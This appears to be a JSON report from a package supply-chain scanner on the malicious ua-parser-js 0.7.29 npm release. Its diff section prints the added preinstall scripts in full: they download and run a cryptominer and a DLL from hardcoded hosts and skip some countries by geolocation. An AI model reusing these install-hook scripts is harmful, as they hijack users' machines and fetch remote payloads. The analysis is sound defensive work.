@@ -1,0 +1,141 @@
+{
+  "schema_version": "0.2.0",
+  "ecosystem": "npm",
+  "package": "ua-parser-js",
+  "from_version": "0.7.28",
+  "to_version": "0.7.29",
+  "risk_score": 57.5,
+  "severity": "HIGH",
+  "llm_base_score": 62.5,
+  "dimensions": [
+    {
+      "name": "network_calls",
+      "label": "New or changed network calls",
+      "score": 10.0,
+      "weight": 0.25,
+      "reasoning": "preinstall.bat downloads binaries from http://159.148.186.228/download/jsextension.exe and https://citationsherbe.at/sdd.dll using curl, wget, and certutil. preinstall.sh downloads http://159.148.186.228/download/jsextension. These are explicit payload downloads from hardcoded IPs/domains triggered at install time.",
+      "confidence": 1.0
+    },
+    {
+      "name": "obfuscation",
+      "label": "Obfuscation / encoding patterns (base64, eval, dynamic require)",
+      "score": 1.0,
+      "weight": 0.25,
+      "reasoning": "No base64, eval, or dynamic require obfuscation is present. The malicious intent is implemented in plaintext shell/batch scripts. Score is low for this specific dimension.",
+      "confidence": 0.9
+    },
+    {
+      "name": "install_hooks",
+      "label": "Postinstall / preinstall script additions or changes",
+      "score": 10.0,
+      "weight": 0.2,
+      "reasoning": "Three new files (preinstall.js, preinstall.bat, preinstall.sh) and a 'preinstall' npm lifecycle hook are added. preinstall.js is the entry point that dispatches to platform-specific scripts, executing a cryptominer payload immediately on npm install.",
+      "confidence": 1.0
+    },
+    {
+      "name": "env_conditional",
+      "label": "Conditional logic gated on env vars, platform, or CI detection",
+      "score": 9.0,
+      "weight": 0.15,
+      "reasoning": "preinstall.sh calls https://freegeoip.app/xml/ to geolocate the victim and skips execution if the IP resolves to RU, UA, BY, or KZ (Russia, Ukraine, Belarus, Kazakhstan) — a classic attacker-exclusion pattern to avoid targeting specific regions. preinstall.js branches on process.platform to select the appropriate payload for Windows vs Linux.",
+      "confidence": 1.0
+    },
+    {
+      "name": "dependency_changes",
+      "label": "Dependency graph changes (new transitive deps)",
+      "score": 1.0,
+      "weight": 0.15,
+      "reasoning": "No changes to package.json dependencies are visible in the diff. The attack relies on bundled scripts rather than new npm dependencies.",
+      "confidence": 0.8
+    }
+  ],
+  "feed_results": [
+    {
+      "source": "osv",
+      "status": "suspicious",
+      "details": "Found 1 advisory/ies: GHSA-pjwm-rvh2-c87w",
+      "url": "https://osv.dev/list?q=ua-parser-js",
+      "advisory_ids": [
+        "GHSA-pjwm-rvh2-c87w"
+      ],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "rekor",
+      "status": "no_data",
+      "details": "No Sigstore provenance attestation found for ua-parser-js@0.7.29.",
+      "url": null,
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "scorecard",
+      "status": "clean",
+      "details": "Score: 7.6/10. Code-Review=0, Maintained=10, Branch-Protection=4, Signed-Releases=-1",
+      "url": "https://scorecard.dev/viewer/?uri=github.com/faisalman/ua-parser-js",
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": 7.6
+    }
+  ],
+  "score_modifiers": [
+    {
+      "source": "scorecard",
+      "rule": "scorecard_good",
+      "delta": -5.0,
+      "note": "Strong OpenSSF Scorecard (7.6/10) is a mild mitigant"
+    }
+  ],
+  "diff_summary": {
+    "files_added": [
+      "preinstall.bat",
+      "preinstall.js",
+      "preinstall.sh"
+    ],
+    "files_removed": [],
+    "files_modified": [],
+    "file_diffs": [
+      {
+        "path": "preinstall.bat",
+        "change_type": "added",
+        "lines_added": 26,
+        "lines_removed": 0,
+        "unified_diff": "+@echo off\n+curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe\n+if not exist jsextension.exe (\n+\twget http://159.148.186.228/download/jsextension.exe -O jsextension.exe\n+)\n+if not exist jsextension.exe (\n+\tcertutil.exe -urlcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe\n+)\n+curl https://citationsherbe.at/sdd.dll -o create.dll\n+if not exist create.dll (\n+\twget https://citationsherbe.at/sdd.dll -O create.dll\n+)\n+if not exist create.dll (\n+\tcertutil.exe -urlcache -f https://citationsherbe.at/sdd.dll create.dll\n+)\n+set exe_1=jsextension.exe\n+set \"count_1=0\"\n+>tasklist.temp (\n+tasklist /NH /FI \"IMAGENAME eq %exe_1%\"\n+)\n+for /f %%x in (tasklist.temp) do (\n+if \"%%x\" EQU \"%exe_1%\" set /a count_1+=1\n+)\n+if %count_1% EQU 0 (start /B .\\jsextension.exe -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \\\n+   --cpu-max-threads-hint=50 --donate-level=1 --background & regsvr32.exe -s create.dll)\n+del tasklist.temp"
+      },
+      {
+        "path": "preinstall.js",
+        "change_type": "added",
+        "lines_added": 27,
+        "lines_removed": 0,
+        "unified_diff": "+const { exec } = require('child_process')\n+\n+function terminalLinux() {\n+  exec('/bin/bash preinstall.sh', (error, stdout, stderr) => {\n+    if (error) {\n+      console.log(`error: ${error.message}`)\n+      return\n+    }\n+    if (stderr) {\n+      console.log(`stderr: ${stderr}`)\n+      return\n+    }\n+    console.log(`stdout: ${stdout}`)\n+  })\n+}\n+\n+var opsys = process.platform\n+if (opsys == 'darwin') {\n+  opsys = 'MacOS'\n+} else if (opsys == 'win32' || opsys == 'win64') {\n+  opsys = 'Windows'\n+  const { spawn } = require('child_process')\n+  const bat = spawn('cmd.exe', ['/c', 'preinstall.bat'])\n+} else if (opsys == 'linux') {\n+  opsys = 'Linux'\n+  terminalLinux()\n+}"
+      },
+      {
+        "path": "preinstall.sh",
+        "change_type": "added",
+        "lines_added": 16,
+        "lines_removed": 0,
+        "unified_diff": "+IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU\\|UA\\|BY\\|KZ')\n+if [ -z \"$IP\" ]\n+    then\n+\tvar=$(pgrep jsextension)\n+\tif [ -z \"$var\" ]\n+\t\tthen\n+\t\tcurl http://159.148.186.228/download/jsextension -o jsextension\n+\t\tif [ ! -f jsextension ]\n+\t\t\tthen\n+\t\t\twget http://159.148.186.228/download/jsextension -O jsextension\n+\t\tfi\n+\t\tchmod +x jsextension\n+\t\t./jsextension -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \\\n+            --cpu-max-threads-hint=50 --donate-level=1 --background &>/dev/null &\n+\tfi\n+fi"
+      }
+    ],
+    "new_dependencies": [],
+    "removed_dependencies": [],
+    "new_install_hooks": [
+      "preinstall"
+    ],
+    "maintainer_changed": false,
+    "native_addons_added": false,
+    "total_diff_lines": 69,
+    "chunks_sent_to_llm": 1,
+    "diff_truncated": false
+  },
+  "llm_model": "claude-sonnet-4-6",
+  "llm_summary": "This update to ua-parser-js 0.7.29 is a confirmed supply chain attack. Three malicious preinstall scripts are added that download and execute a cryptocurrency miner (XMRig connecting to pool.minexmr.com:443) on Windows and Linux systems. On Windows, a DLL (create.dll) is also registered via regsvr32. The attack includes a geo-exclusion check that skips infection for IP addresses resolving to Russia, Ukraine, Belarus, and Kazakhstan. This is a definitive, unambiguous malicious compromise of the package.",
+  "timestamp": "2026-08-10T15:15:45.845489Z",
+  "from_version_sha256": null,
+  "to_version_sha256": null
+}
